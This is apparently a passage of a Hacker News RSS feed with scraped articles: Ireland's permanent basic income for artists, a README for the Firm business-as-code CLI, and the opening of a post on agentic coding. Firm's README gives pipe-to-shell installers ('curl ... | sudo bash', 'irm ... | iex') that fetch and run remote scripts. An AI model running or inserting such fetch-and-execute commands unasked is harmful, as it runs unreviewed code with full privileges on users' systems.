<li>Portable mode</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Why?</h2><a id="user-content-why" aria-label="Permalink: Why?" href="#why"></a></p>
<a href="https://xkcd.com/1782/" rel="nofollow">
  <img src="https://camo.githubusercontent.com/93c53e2e93199d74759fe27e8c605ae5e180b733ca23111a2022e67493b3a53c/68747470733a2f2f696d67732e786b63642e636f6d2f636f6d6963732f7465616d5f636861742e706e67" title="2078: He announces that he's finally making the jump from screen+irssi to tmux+weechat." data-canonical-src="https://imgs.xkcd.com/comics/team_chat.png">
</a>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">Halloy is released under the GPL-3.0 License. For more details, see the <a href="https://github.com/squidowl/halloy/blob/main/LICENSE">LICENSE</a> file.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contact</h2><a id="user-content-contact" aria-label="Permalink: Contact" href="#contact"></a></p>
<p dir="auto">For any questions, suggestions, or issues, please open an issue on the <a href="https://github.com/squidowl/halloy/issues">GitHub repository</a>.</p>
<a href="https://github.com/iced-rs/iced">
  <img src="https://gist.githubusercontent.com/hecrj/ad7ecd38f6e47ff3688a38c79fd108f0/raw/74384875ecbad02ae2a926425e9bcafd0695bade/color.svg" width="130px">
</a>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ireland Is Making Basic Income for Artists Program Permanent (426 pts)]]></title>
            <link>https://www.artnews.com/art-news/news/ireland-basic-income-artists-program-permanent-1234756981/</link>
            <guid>45590900</guid>
            <pubDate>Wed, 15 Oct 2025 11:40:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.artnews.com/art-news/news/ireland-basic-income-artists-program-permanent-1234756981/">https://www.artnews.com/art-news/news/ireland-basic-income-artists-program-permanent-1234756981/</a>, See on <a href="https://news.ycombinator.com/item?id=45590900">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>
	Several years after launching a trial, <a href="https://www.artnews.com/t/ireland/" id="auto-tag_ireland" data-tag="ireland">Ireland</a> is set to make its basic income for artists program permanent starting in 2026.</p>



<p>
	Under the program, selected artists receive a weekly payment of approximately $375, or about $1,500 per month. There are 2,000 spots available, with applications <a href="https://www.citizensinformation.ie/en/employment/unemployment-and-redundancy/employment-support-schemes/basic-income-arts/" rel="nofollow" target="_blank">set to open</a> in September 2026; eligibility criteria have not yet been announced. The government may expand the program to additional applicants in the future, should more funding become available, according to <a href="https://www.rte.ie/culture/2025/1007/1537249-budget-2026-basic-income-for-artists-scheme-to-become-permanent/" rel="nofollow" target="_blank">Irish broadcaster <em>RTÉ</em></a>.</p>



<div><p>
	The current program, which began in 2022 and is set to end in February after a six-month extension agreed to earlier this year, was launched to support the arts sector following the pandemic. Many artists suffered disproportionate income losses during that time due to the cancelation of live performances and events.</p><p>For the pilot, applicants could apply under visual arts, theater, literature, music, dance, opera, film, circuses, and architecture. They were required to submit two pieces of evidence proving that they were professional cultural workers, such as proof of income from art sales, membership in a professional body, or reviews. At the time, the <em>New York Times</em> <a href="https://www.nytimes.com/2023/03/23/arts/ireland-basic-income-artists.html" rel="nofollow" target="_blank">reported</a> that more than 9,000 people applied, with 8,200 deemed eligible and 2,000 randomly selected to receive payments. Another 1,000 eligible applicants were placed in a control group to be monitored but not receive funds.

	</p></div>
<section>
	

	<h2 id="section-heading">

	
		Related Articles
	
	</h2>


	
</section>




<p>
	The announcement follows the release of an <a href="https://assets.gov.ie/static/documents/b87d2659/20250929_BIA_CBA_Final_Report.pdf" rel="nofollow" target="_blank">external report</a> by UK-based consultants Alma Economics, which found that the pilot cost €72 million to date but generated nearly €80 million in total benefits to the Irish economy. The report also found that recipients’ arts-related income increased by more than €500 per month on average, income from non-arts work decreased by around €280, and reliance on other social programs declined, with participants receiving €100 less per month on average.</p>



<p>
	“The economic return on this investment in Ireland’s artists and creative arts workers is having an immediate positive impact on the sector and the economy overall,” Patrick O’Donovan, minister for culture, communications, and sport, <a href="https://www.gov.ie/en/department-of-culture-communications-and-sport/press-releases/basic-income-for-the-arts-pilot-produced-over-100-million-in-social-and-economic-benefits/" rel="nofollow" target="_blank">said</a> in a statement.</p>



<p>
	The report further estimated that a permanent, “scaled-up” program would likely result in artists producing 22 percent more work, while lowering the average cost of art to consumers by 9 to 25 percent.</p>



<div><p>
	In October, the government <a href="https://www.gov.ie/en/department-of-culture-communications-and-sport/press-releases/public-consultation-confirms-overwhelming-support-for-making-basic-income-for-the-arts-permanent/" rel="nofollow" target="_blank">released</a> the results of a public survey on the scheme, which found that 97 percent of respondents support the program. However, 47 percent of the 17,000 respondents said artists should be selected based on economic need, while 37.5 percent favored selection by merit. Only 14 percent preferred random selection.</p><p>Ireland’s BIA program is a form of universal basic income, a policy that grants all citizens a recurring payment regardless of socioeconomic status or other factors. Such programs have grown increasingly mainstream—if not widely implemented—in recent years, as fears rise over the effects of artificial intelligence and other technology-driven job losses. Many UBI advocates have cited Ireland’s program as evidence that the model works.

</p></div>



<p>
	“As the pilot shows, basic income works and people need a UBI now to face and deal with the many social, economic, and ecological crises of our world. The Network will continue to help demonstrate basic income within communities and show how it is a sustainable policy,” the UBI Lab Network said in a statement calling for a nationwide program.</p>



<p>
	“We need no further pilots. People need a UBI now to face and deal with the many social, economic, and ecological crises of our world,” Reinhard Huss, organizer of UBI Lab Leeds, told <em><a href="https://www.businessinsider.com/ireland-artists-basic-income-pilot-results-2025-6" rel="nofollow" target="_blank">Business Insider</a></em> in June.</p>










</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why We're Leaving Serverless (275 pts)]]></title>
            <link>https://www.unkey.com/blog/serverless-exit</link>
            <guid>45590756</guid>
            <pubDate>Wed, 15 Oct 2025 11:20:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.unkey.com/blog/serverless-exit">https://www.unkey.com/blog/serverless-exit</a>, See on <a href="https://news.ycombinator.com/item?id=45590756">Hacker News</a></p>
Couldn't get https://www.unkey.com/blog/serverless-exit: Error: Request failed with status code 429]]></description>
        </item>
        <item>
            <title><![CDATA[Something is broken with the way we measure success on the internet (332 pts)]]></title>
            <link>https://joindatacops.com/resources/how-73-of-your-e-commerce-visitors-could-be-fake</link>
            <guid>45590681</guid>
            <pubDate>Wed, 15 Oct 2025 11:11:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://joindatacops.com/resources/how-73-of-your-e-commerce-visitors-could-be-fake">https://joindatacops.com/resources/how-73-of-your-e-commerce-visitors-could-be-fake</a>, See on <a href="https://news.ycombinator.com/item?id=45590681">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h4>Accurate Ad Spend Analytics, Built for Compliance.</h4><p>Make confident, data-driven decisions with actionable ad spend insights.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Britain has wasted £1,112,293,718 switching off wind turbines in 2025 (276 pts)]]></title>
            <link>https://wastedwind.energy/</link>
            <guid>45590236</guid>
            <pubDate>Wed, 15 Oct 2025 10:10:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://wastedwind.energy/">https://wastedwind.energy/</a>, See on <a href="https://news.ycombinator.com/item?id=45590236">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Firm, a text-based work management system (133 pts)]]></title>
            <link>https://github.com/42futures/firm</link>
            <guid>45588959</guid>
            <pubDate>Wed, 15 Oct 2025 07:01:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/42futures/firm">https://github.com/42futures/firm</a>, See on <a href="https://news.ycombinator.com/item?id=45588959">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Firm: Business-as-code</h2><a id="user-content-firm-business-as-code" aria-label="Permalink: Firm: Business-as-code" href="#firm-business-as-code"></a></p>
<p dir="auto">A text-based work management system for technologists.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/42futures/firm/blob/main/media/demo.gif"><img src="https://github.com/42futures/firm/raw/main/media/demo.gif" alt="Firm CLI demo" data-animated-image=""></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Why?</h2><a id="user-content-why" aria-label="Permalink: Why?" href="#why"></a></p>
<p dir="auto">Modern businesses are natively digital, but lack a unified view. Your data is scattered across SaaS tools you don't control, so you piece together answers by jumping between platforms.</p>
<p dir="auto">Your business is a graph: customers link to projects, projects link to tasks, people link to organizations. Firm lets you define these relationships in plain text files (you own!).</p>
<p dir="auto">Version controlled, locally stored and structured as code with the Firm DSL. This structured representation of your work, <em>business-as-code</em>, makes your business readable to yourself and to the robots that help you run it.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Features</h3><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<ul dir="auto">
<li><strong>Everything in one place:</strong> Organizations, contacts, projects, and how they relate.</li>
<li><strong>Own your data:</strong> Plain text files and tooling that runs on your machine.</li>
<li><strong>Open data model:</strong> Tailor to your business with custom schemas.</li>
<li><strong>Automate anything:</strong> Search, report, integrate, whatever. It's just code.</li>
<li><strong>AI-ready:</strong> LLMs can read, write, and query your business structure.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto">The Firm CLI is available to download via Github Releases. Install scripts are provided for desktop platforms to make that process easy.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Linux and macOS</h3><a id="user-content-linux-and-macos" aria-label="Permalink: Linux and macOS" href="#linux-and-macos"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="curl -fsSL https://raw.githubusercontent.com/42futures/firm/main/install.sh | sudo bash"><pre>curl -fsSL https://raw.githubusercontent.com/42futures/firm/main/install.sh <span>|</span> sudo bash</pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Windows</h3><a id="user-content-windows" aria-label="Permalink: Windows" href="#windows"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="irm https://raw.githubusercontent.com/42futures/firm/main/install.ps1 | iex"><pre>irm https://raw.githubusercontent.com/42futures/firm/main/install.ps1 <span>|</span> iex</pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Getting started</h2><a id="user-content-getting-started" aria-label="Permalink: Getting started" href="#getting-started"></a></p>
<p dir="auto">Firm operates on a "workspace": a directory containing all your <code>.firm</code> DSL files. The Firm CLI processes every file in this workspace to build a unified, queryable graph of your business.</p>
<p dir="auto">The first step is to add an entity to your workspace. You can do this either by using the CLI or by writing the DSL yourself.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Add entities with the CLI</h3><a id="user-content-add-entities-with-the-cli" aria-label="Permalink: Add entities with the CLI" href="#add-entities-with-the-cli"></a></p>
<p dir="auto">Use <code>firm add</code> to interactively generate new entities. Out of the box, Firm supports a set of pre-built entity schemas for org mapping, customer relations and work management. The CLI will prompt you for the necessary info and generate corresponding DSL.</p>

<div data-snippet-clipboard-copy-content="Adding new entity

> Type: organization
> ID: megacorp
> Name: Megacorp Ltd.
> Email: mega@corp.com
> Urls: [&quot;corp.com&quot;]

Writing generated DSL to file my_workspace/generated/organization.firm"><pre><code>Adding new entity

&gt; Type: organization
&gt; ID: megacorp
&gt; Name: Megacorp Ltd.
&gt; Email: mega@corp.com
&gt; Urls: ["corp.com"]

Writing generated DSL to file my_workspace/generated/organization.firm
</code></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Write DSL manually</h3><a id="user-content-write-dsl-manually" aria-label="Permalink: Write DSL manually" href="#write-dsl-manually"></a></p>
<p dir="auto">Alternatively, you can create a <code>.firm</code> file and write the DSL yourself.</p>
<div data-snippet-clipboard-copy-content="organization megacorp {
  name = &quot;Megacorp Ltd.&quot;
  email = &quot;mega@corp.com&quot;
  urls = [&quot;corp.com&quot;]
}"><pre lang="firm"><code>organization megacorp {
  name = "Megacorp Ltd."
  email = "mega@corp.com"
  urls = ["corp.com"]
}
</code></pre></div>
<p dir="auto">Both of these methods achieve the same result: a new entity defined in your Firm workspace.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Querying the workspace</h3><a id="user-content-querying-the-workspace" aria-label="Permalink: Querying the workspace" href="#querying-the-workspace"></a></p>
<p dir="auto">Once you have entities in your workspace, you can query them using the CLI.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Listing entities</h4><a id="user-content-listing-entities" aria-label="Permalink: Listing entities" href="#listing-entities"></a></p>
<p dir="auto">Use <code>firm list</code> to see all entities of a specific type.</p>

<div data-snippet-clipboard-copy-content="Found 7 entities with type 'task'

ID: task.design_homepage
Name: Design new homepage
Is completed: false
Assignee ref: person.jane_doe

..."><pre><code>Found 7 entities with type 'task'

ID: task.design_homepage
Name: Design new homepage
Is completed: false
Assignee ref: person.jane_doe

...
</code></pre></div>
<p dir="auto"><h4 tabindex="-1" dir="auto">Getting an entity</h4><a id="user-content-getting-an-entity" aria-label="Permalink: Getting an entity" href="#getting-an-entity"></a></p>
<p dir="auto">To view the full details of a single entity, use <code>firm get</code> followed by the entity's type and ID.</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ firm get person john_doe"><pre>$ firm get person john_doe</pre></div>
<div data-snippet-clipboard-copy-content="Found 'person' entity with ID 'john_doe'

ID: person.john_doe
Name: John Doe
Email: john@doe.com"><pre><code>Found 'person' entity with ID 'john_doe'

ID: person.john_doe
Name: John Doe
Email: john@doe.com
</code></pre></div>
<p dir="auto"><h4 tabindex="-1" dir="auto">Exploring relationships</h4><a id="user-content-exploring-relationships" aria-label="Permalink: Exploring relationships" href="#exploring-relationships"></a></p>
<p dir="auto">The power of Firm lies in its ability to travel a graph of your business. Use <code>firm related</code> to explore connections to/from any entity.</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ firm related contact john_doe"><pre>$ firm related contact john_doe</pre></div>
<div data-snippet-clipboard-copy-content="Found 1 relationships for 'contact' entity with ID 'john_doe'

ID: interaction.megacorp_intro
Type: Call
Subject: Initial discussion about Project X
Interaction date: 2025-09-30 09:45:00 +02:00
Initiator ref: person.jane_smith
Primary contact ref: contact.john_doe"><pre><code>Found 1 relationships for 'contact' entity with ID 'john_doe'

ID: interaction.megacorp_intro
Type: Call
Subject: Initial discussion about Project X
Interaction date: 2025-09-30 09:45:00 +02:00
Initiator ref: person.jane_smith
Primary contact ref: contact.john_doe
</code></pre></div>
<p dir="auto"><h4 tabindex="-1" dir="auto">What's next</h4><a id="user-content-whats-next" aria-label="Permalink: What's next" href="#whats-next"></a></p>
<p dir="auto">You've seen the basic commands for interacting with a Firm workspace. The project is a work-in-progress, and you can expect to see more sophisticated features added over time, including a more powerful query engine and tools for running business workflows directly from the CLI.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Using Firm as a library</h2><a id="user-content-using-firm-as-a-library" aria-label="Permalink: Using Firm as a library" href="#using-firm-as-a-library"></a></p>
<p dir="auto">Beyond the CLI, you can integrate Firm's core logic directly into your own software using the <code>firm_core</code> and <code>firm_lang</code> Rust packages. This allows you to build more powerful automations and integrations on top of Firm.</p>
<p dir="auto">First, add the Firm crates to your <code>Cargo.toml</code>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="[dependencies]
firm_core = { git = &quot;https://github.com/42futures/firm.git&quot; }
firm_lang = { git = &quot;https://github.com/42futures/firm.git&quot; }"><pre>[<span>dependencies</span>]
<span>firm_core</span> = { <span>git</span> = <span><span>"</span>https://github.com/42futures/firm.git<span>"</span></span> }
<span>firm_lang</span> = { <span>git</span> = <span><span>"</span>https://github.com/42futures/firm.git<span>"</span></span> }</pre></div>
<p dir="auto">You can then load a workspace, build the entity graph, and query it programmatically:</p>
<div dir="auto" data-snippet-clipboard-copy-content="use firm_lang::workspace::Workspace;
use firm_core::EntityGraph;

// Load workspace from a directory
let mut workspace = Workspace::new();
workspace.load_directory(&quot;./my_workspace&quot;)?;
let build = workspace.build()?;

// Build the graph from the workspace entities
let mut graph = EntityGraph::new();
graph.add_entities(build.entities)?;
graph.build();

// Query the graph for a specific entity
let lead = graph.get_entity(&amp;EntityId::new(&quot;lead.ai_validation_project&quot;))?;

// Traverse a relationship to another entity
let contact_ref = lead.get_field(FieldId::new(&quot;contact_ref&quot;))?;
let contact = contact_ref.resolve_entity_reference(&amp;graph)?;"><pre><span>use</span> firm_lang<span>::</span>workspace<span>::</span><span>Workspace</span><span>;</span>
<span>use</span> firm_core<span>::</span><span>EntityGraph</span><span>;</span>

<span>// Load workspace from a directory</span>
<span>let</span> <span>mut</span> workspace = <span>Workspace</span><span>::</span><span>new</span><span>(</span><span>)</span><span>;</span>
workspace<span>.</span><span>load_directory</span><span>(</span><span>"./my_workspace"</span><span>)</span>?<span>;</span>
<span>let</span> build = workspace<span>.</span><span>build</span><span>(</span><span>)</span>?<span>;</span>

<span>// Build the graph from the workspace entities</span>
<span>let</span> <span>mut</span> graph = <span>EntityGraph</span><span>::</span><span>new</span><span>(</span><span>)</span><span>;</span>
graph<span>.</span><span>add_entities</span><span>(</span>build<span>.</span><span>entities</span><span>)</span>?<span>;</span>
graph<span>.</span><span>build</span><span>(</span><span>)</span><span>;</span>

<span>// Query the graph for a specific entity</span>
<span>let</span> lead = graph<span>.</span><span>get_entity</span><span>(</span><span>&amp;</span><span>EntityId</span><span>::</span><span>new</span><span>(</span><span>"lead.ai_validation_project"</span><span>)</span><span>)</span>?<span>;</span>

<span>// Traverse a relationship to another entity</span>
<span>let</span> contact_ref = lead<span>.</span><span>get_field</span><span>(</span><span>FieldId</span><span>::</span><span>new</span><span>(</span><span>"contact_ref"</span><span>)</span><span>)</span>?<span>;</span>
<span>let</span> contact = contact_ref<span>.</span><span>resolve_entity_reference</span><span>(</span><span>&amp;</span>graph<span>)</span>?<span>;</span></pre></div>
<p dir="auto">This gives you full access to the underlying data structures, providing a foundation for building custom business automations.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Architecture</h2><a id="user-content-architecture" aria-label="Permalink: Architecture" href="#architecture"></a></p>
<p dir="auto">Firm is organized as a Rust workspace with three crates:</p>
<p dir="auto"><h3 tabindex="-1" dir="auto"><code>firm_core</code></h3><a id="user-content-firm_core" aria-label="Permalink: firm_core" href="#firm_core"></a></p>
<p dir="auto">Core data structures and graph operations.</p>
<ul dir="auto">
<li>Entity data model</li>
<li>Typed fields with references</li>
<li>Relationship graph with query capabilities</li>
<li>Entity schemas and validation</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto"><code>firm_lang</code></h3><a id="user-content-firm_lang" aria-label="Permalink: firm_lang" href="#firm_lang"></a></p>
<p dir="auto">DSL parsing and generation.</p>
<ul dir="auto">
<li>Tree-sitter-based parser for <code>.firm</code> files</li>
<li>Conversion between DSL and entities</li>
<li>Workspace support for multi-file projects</li>
<li>DSL generation from entities</li>
</ul>
<p dir="auto">Grammar is defined in <a href="https://github.com/42futures/tree-sitter-firm">tree-sitter-firm</a>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto"><code>firm_cli</code></h3><a id="user-content-firm_cli" aria-label="Permalink: firm_cli" href="#firm_cli"></a></p>
<p dir="auto">Command-line interface, making the Firm workspace interactive.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Core concepts</h2><a id="user-content-core-concepts" aria-label="Permalink: Core concepts" href="#core-concepts"></a></p>
<p dir="auto">Firm's data model is built on a few key concepts. Each concept is accessible declaratively through the <code>.firm</code> DSL for human-readable definitions, and programmatically through the Rust packages for building your own automations.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Entities</h3><a id="user-content-entities" aria-label="Permalink: Entities" href="#entities"></a></p>
<p dir="auto">Entities are the fundamental business objects in your workspace, like people, organizations, or projects. Each entity has a unique ID, a type, and a collection of fields.</p>
<p dir="auto"><strong>In the DSL</strong>, you define an entity with its type and ID, followed by its fields in a block:</p>
<div data-snippet-clipboard-copy-content="person john_doe {
    name = &quot;John Doe&quot;
    email = &quot;john@doe.com&quot;
}"><pre lang="firm"><code>person john_doe {
    name = "John Doe"
    email = "john@doe.com"
}
</code></pre></div>
<p dir="auto"><strong>In Rust</strong>, this corresponds to an <code>Entity</code> struct:</p>
<div dir="auto" data-snippet-clipboard-copy-content="let person = Entity::new(EntityId::new(&quot;john_doe&quot;), EntityType::new(&quot;person&quot;))
    .with_field(FieldId::new(&quot;name&quot;), &quot;John Doe&quot;)
    .with_field(FieldId::new(&quot;email&quot;), &quot;john@doe.com&quot;);"><pre><span>let</span> person = <span>Entity</span><span>::</span><span>new</span><span>(</span><span>EntityId</span><span>::</span><span>new</span><span>(</span><span>"john_doe"</span><span>)</span><span>,</span> <span>EntityType</span><span>::</span><span>new</span><span>(</span><span>"person"</span><span>)</span><span>)</span>
    <span>.</span><span>with_field</span><span>(</span><span>FieldId</span><span>::</span><span>new</span><span>(</span><span>"name"</span><span>)</span><span>,</span> <span>"John Doe"</span><span>)</span>
    <span>.</span><span>with_field</span><span>(</span><span>FieldId</span><span>::</span><span>new</span><span>(</span><span>"email"</span><span>)</span><span>,</span> <span>"john@doe.com"</span><span>)</span><span>;</span></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Fields</h3><a id="user-content-fields" aria-label="Permalink: Fields" href="#fields"></a></p>
<p dir="auto">Fields are typed key-value pairs attached to an entity. Firm supports a rich set of types:</p>
<ul dir="auto">
<li><code>String</code></li>
<li><code>Integer</code></li>
<li><code>Float</code></li>
<li><code>Boolean</code></li>
<li><code>Currency</code></li>
<li><code>DateTime</code></li>
<li><code>List</code> of other values</li>
<li><code>Reference</code> to other fields or entities</li>
<li><code>Path</code> to a local file</li>
</ul>
<p dir="auto"><strong>In the DSL</strong>, the syntax maps directly to these types:</p>
<div data-snippet-clipboard-copy-content="my_task design_homepage {
    title = &quot;Design new homepage&quot;        // String
    priority = 1                         // Integer
    completed = false                    // Boolean
    budget = 5000.00 USD                 // Currency
    due_date = 2024-12-01 at 17:00 UTC   // DateTime
    tags = [&quot;ui&quot;, &quot;ux&quot;]                  // List
    assignee = person.jane_doe           // Reference
    deliverable = path&quot;./homepage.zip&quot;   // Path
}"><pre lang="firm"><code>my_task design_homepage {
    title = "Design new homepage"        // String
    priority = 1                         // Integer
    completed = false                    // Boolean
    budget = 5000.00 USD                 // Currency
    due_date = 2024-12-01 at 17:00 UTC   // DateTime
    tags = ["ui", "ux"]                  // List
    assignee = person.jane_doe           // Reference
    deliverable = path"./homepage.zip"   // Path
}
</code></pre></div>
<p dir="auto"><strong>In Rust</strong>, these are represented by the <code>FieldValue</code> enum:</p>
<div dir="auto" data-snippet-clipboard-copy-content="let value = FieldValue::Integer(42);"><pre><span>let</span> value = <span>FieldValue</span><span>::</span><span>Integer</span><span>(</span><span>42</span><span>)</span><span>;</span></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Relationships and the entity graph</h3><a id="user-content-relationships-and-the-entity-graph" aria-label="Permalink: Relationships and the entity graph" href="#relationships-and-the-entity-graph"></a></p>
<p dir="auto">The power of Firm comes from connecting entities. You create relationships using <code>Reference</code> fields.</p>
<p dir="auto">When Firm processes your workspace, it builds the <em>entity graph</em> representing of all your entities (as nodes) and their relationships (as directed edges). This graph is what allows for traversal and querying.</p>
<p dir="auto"><strong>In the DSL</strong>, creating a relationship is as simple as referencing another entity's ID.</p>
<div data-snippet-clipboard-copy-content="contact john_at_acme {
    person_ref = person.john_doe
    organization_ref = organization.acme_corp
}"><pre lang="firm"><code>contact john_at_acme {
    person_ref = person.john_doe
    organization_ref = organization.acme_corp
}
</code></pre></div>
<p dir="auto"><strong>In Rust</strong>, you build the graph by loading entities and calling the <code>.build()</code> method, which resolves all references into queryable links.</p>
<div dir="auto" data-snippet-clipboard-copy-content="let mut graph = EntityGraph::new();
graph.add_entities(workspace.build()?.entities)?;
graph.build(); // Builds relationships from references

// Now you can traverse the graph
let contact = graph.get_entity(&amp;EntityId::new(&quot;contact.john_at_acme&quot;))?;
let person_ref = contact.get_field(FieldId::new(&quot;person_ref&quot;))?;
let person = person_ref.resolve_entity_reference(&amp;graph)?;"><pre><span>let</span> <span>mut</span> graph = <span>EntityGraph</span><span>::</span><span>new</span><span>(</span><span>)</span><span>;</span>
graph<span>.</span><span>add_entities</span><span>(</span>workspace<span>.</span><span>build</span><span>(</span><span>)</span>?<span>.</span><span>entities</span><span>)</span>?<span>;</span>
graph<span>.</span><span>build</span><span>(</span><span>)</span><span>;</span> <span>// Builds relationships from references</span>

<span>// Now you can traverse the graph</span>
<span>let</span> contact = graph<span>.</span><span>get_entity</span><span>(</span><span>&amp;</span><span>EntityId</span><span>::</span><span>new</span><span>(</span><span>"contact.john_at_acme"</span><span>)</span><span>)</span>?<span>;</span>
<span>let</span> person_ref = contact<span>.</span><span>get_field</span><span>(</span><span>FieldId</span><span>::</span><span>new</span><span>(</span><span>"person_ref"</span><span>)</span><span>)</span>?<span>;</span>
<span>let</span> person = person_ref<span>.</span><span>resolve_entity_reference</span><span>(</span><span>&amp;</span>graph<span>)</span>?<span>;</span></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Schemas</h3><a id="user-content-schemas" aria-label="Permalink: Schemas" href="#schemas"></a></p>
<p dir="auto">Schemas allow you to define and enforce a structure for your entities, ensuring data consistency. You can specify which fields are required or optional and what their types should be.</p>
<p dir="auto"><strong>In the DSL</strong>, you can define a schema that other entities can adhere to:</p>
<div data-snippet-clipboard-copy-content="schema custom_project {
    field {
        name = &quot;title&quot;
        type = &quot;string&quot;
        required = true
    }
    field {
        name = &quot;budget&quot;
        type = &quot;currency&quot;
        required = false
    }
}

custom_project my_project {
    title  = &quot;My custom project&quot;
    budget = 42000 EUR
}"><pre lang="firm"><code>schema custom_project {
    field {
        name = "title"
        type = "string"
        required = true
    }
    field {
        name = "budget"
        type = "currency"
        required = false
    }
}

custom_project my_project {
    title  = "My custom project"
    budget = 42000 EUR
}
</code></pre></div>
<p dir="auto"><strong>In Rust</strong>, you can define schemas programmatically to validate entities.</p>
<div dir="auto" data-snippet-clipboard-copy-content="let schema = EntitySchema::new(EntityType::new(&quot;project&quot;))
    .with_required_field(FieldId::new(&quot;title&quot;), FieldType::String)
    .with_optional_field(FieldId::new(&quot;budget&quot;), FieldType::Currency);

schema.validate(&amp;some_project_entity)?;"><pre><span>let</span> schema = <span>EntitySchema</span><span>::</span><span>new</span><span>(</span><span>EntityType</span><span>::</span><span>new</span><span>(</span><span>"project"</span><span>)</span><span>)</span>
    <span>.</span><span>with_required_field</span><span>(</span><span>FieldId</span><span>::</span><span>new</span><span>(</span><span>"title"</span><span>)</span><span>,</span> <span>FieldType</span><span>::</span><span>String</span><span>)</span>
    <span>.</span><span>with_optional_field</span><span>(</span><span>FieldId</span><span>::</span><span>new</span><span>(</span><span>"budget"</span><span>)</span><span>,</span> <span>FieldType</span><span>::</span><span>Currency</span><span>)</span><span>;</span>

schema<span>.</span><span>validate</span><span>(</span><span>&amp;</span>some_project_entity<span>)</span>?<span>;</span></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Built-in entities</h2><a id="user-content-built-in-entities" aria-label="Permalink: Built-in entities" href="#built-in-entities"></a></p>
<p dir="auto">Firm includes schemas for a range of built-in entities like Person, Organization, and Industry.</p>
<p dir="auto">Firm's entity taxonomy is built on the <a href="https://en.wikipedia.org/wiki/Resources,_Events,_Agents" rel="nofollow">REA model (Resources, Events, Agents)</a> with inspiration from <a href="https://schema.org/Person" rel="nofollow">Schema.org</a>, designed for flexible composition and efficient queries.</p>
<p dir="auto">Every entity maps to a Resource (thing with value), an Event (thing that happens), or an Agent (thing that acts).</p>
<p dir="auto">We separate objective reality from business relationships:</p>
<ul dir="auto">
<li><strong>Fundamental entities</strong> represent things that exist independently (<code>Person</code>, <code>Organization</code>, <code>Document</code>)</li>
<li><strong>Contextual entities</strong> represent your business relationships and processes (<code>Contact</code>, <code>Lead</code>, <code>Project</code>)</li>
</ul>
<p dir="auto">Entities reference each other rather than extending. One <code>Person</code> can be referenced by multiple <code>Contact</code>, <code>Employee</code>, and <code>Partner</code> entities simultaneously.</p>
<p dir="auto">When the entity graph is built, all <code>Reference</code> values automatically create directed edges between entities. This enables traversal queries like "find all Tasks for Opportunities whose Contacts work at Organization X" without complex joins.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Just talk to it – A way of agentic engineering (152 pts)]]></title>
            <link>https://steipete.me/posts/just-talk-to-it</link>
            <guid>45588689</guid>
            <pubDate>Wed, 15 Oct 2025 06:21:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://steipete.me/posts/just-talk-to-it">https://steipete.me/posts/just-talk-to-it</a>, See on <a href="https://news.ycombinator.com/item?id=45588689">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="article" data-astro-cid-vj4tpspi=""> <img src="https://steipete.me/assets/img/2025/just-talk-to-it/curve-angentic.jpg" alt="" loading="lazy" data-astro-cid-vj4tpspi=""> <p>I’ve been more quiet here lately as I’m knee-deep working on my latest project. Agentic engineering has become so good that it now writes pretty much 100% of my code. And yet I see so many folks trying to solve issues and generating these elaborated charades instead of getting sh*t done.</p>
<p>This post partly is inspired by the conversations I had at last night’s <a href="https://x.com/christianklotz/status/1977866496001867925">Claude Code Anonymous in London</a> and partly since <a href="https://x.com/pmddomingos/status/1976399060052607469">it’s been an AI year</a> since my last workflow update. Time for a check-in.</p>
<p>All of the basic ideas still apply, so I won’t mention simple things like context management again. Read my <a href="https://steipete.me/posts/2025/optimal-ai-development-workflow">Optimal AI Workflow post</a> for a primer.</p>
<h2 id="context--tech-stack">Context &amp; Tech-Stack</h2>
